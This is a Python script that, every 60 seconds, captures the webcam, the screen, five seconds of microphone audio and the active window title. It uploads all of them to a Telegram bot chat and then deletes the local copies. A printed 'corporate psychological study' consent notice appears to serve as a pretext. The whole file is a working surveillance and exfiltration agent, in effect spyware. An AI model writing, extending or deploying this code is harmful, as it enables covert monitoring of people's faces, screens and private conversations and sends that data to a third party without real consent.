import os
import time
import cv2
import sounddevice as sd
from scipy.io import wavfile
import requests
from dotenv import load_dotenv
from PIL import ImageGrab
import numpy as np

# Platform specific imports
try:
    import pygetwindow as gw
except ImportError:
    gw = None

load_dotenv()

# Configuration
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
TOPIC_WEBCAM = os.getenv("TOPIC_WEBCAM")
TOPIC_SCREENSHOT = os.getenv("TOPIC_SCREENSHOT")
TOPIC_GENERAL = os.getenv("TOPIC_GENERAL")

INTERVAL = 60  # seconds between captures
AUDIO_DURATION = 5  # seconds
SAMPLE_RATE = 44100

def get_active_window():
    if gw:
        try:
            window = gw.getActiveWindow()
            return window.title if window else "Unknown"
        except Exception:
            return "Error retrieving window"
    return "Non-Windows Environment"

def capture_webcam(filename="webcam.jpg"):
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        print("Could not open webcam")
        return False
    
    # Allow camera to warm up
    time.sleep(0.5)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(filename, frame)
    
    cam.release()
    return ret

def capture_screenshot(filename="screen.jpg"):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        return True
    except Exception as e:
        print(f"Screenshot error: {e}")
        return False

def capture_audio(filename="audio.wav"):
    try:
        print(f"Recording {AUDIO_DURATION}s of audio...")
        recording = sd.rec(int(AUDIO_DURATION * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1)
        sd.wait()
        wavfile.write(filename, SAMPLE_RATE, recording)
        return True
    except Exception as e:
        print(f"Audio error: {e}")
        return False

def send_to_telegram(window_title):
    url_photo = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    url_doc = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    
    caption = f"🖥 Active Window: {window_title}"
    
    def post_data(url, data_type, topic_id, extra_data, files):
        payload = {
            "chat_id": CHAT_ID,
            "caption": extra_data
        }
        if topic_id:
            payload["message_thread_id"] = topic_id
            
        try:
            resp = requests.post(url, data=payload, files=files)
            result = resp.json()
            if not result.get("ok"):
                print(f"FAILED to send {data_type}: {result.get('description')}")
                # Fallback for General topic if thread ID 1 is rejected
                if topic_id == "1":
                    print("Topic 1 failed, attempting send to General (no thread ID)...")
                    del payload["message_thread_id"]
                    requests.post(url, data=payload, files=files)
            else:
                print(f"SUCCESS: {data_type} sent to Topic {topic_id if topic_id else 'General'}")
        except Exception as e:
            print(f"NETWORK ERROR sending {data_type}: {e}")

    # Send Screenshot to TOPIC_SCREENSHOT
    if os.path.exists("screen.jpg"):
        with open("screen.jpg", "rb") as f:
            post_data(url_photo, "photo", TOPIC_SCREENSHOT, f"SCREENSHOT\n{caption}", {"photo": f})
            
    # Send Webcam to TOPIC_WEBCAM
    if os.path.exists("webcam.jpg"):
        with open("webcam.jpg", "rb") as f:
            post_data(url_photo, "photo", TOPIC_WEBCAM, f"WEBCAM\n{caption}", {"photo": f})

    # Send Audio to TOPIC_GENERAL
    if os.path.exists("audio.wav"):
        with open("audio.wav", "rb") as f:
            post_data(url_doc, "document", TOPIC_GENERAL, f"AUDIO (Ambient)\n{caption}", {"document": f})

def main():
    if not TOKEN or not CHAT_ID:
        print("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env file.")
        return

    print("Agent started. Press Ctrl+C to stop.")
    
    # Initial Consent/Notice
    print("--- NOTICE ---")
    print("This application is part of a corporate psychological study.")
    print("By running this, you consent to periodic screen, webcam, and audio capture.")
    print("--------------")

    try:
        while True:
            window_title = get_active_window()
            print(f"[{time.strftime('%H:%M:%S')}] Capturing data... (Active: {window_title})")
            
            # Capture all data points
            capture_webcam()
            capture_screenshot()
            capture_audio()
            
            # Send to Telegram
            send_to_telegram(window_title)
            
            # Cleanup temp files
            for f in ["webcam.jpg", "screen.jpg", "audio.wav"]:
                if os.path.exists(f):
                    os.remove(f)
            
            print(f"Payload sent to respective topics. Sleeping for {INTERVAL}s...")
            time.sleep(INTERVAL)
            
    except KeyboardInterrupt:
        print("Agent stopped by user.")

if __name__ == "__main__":
    main()
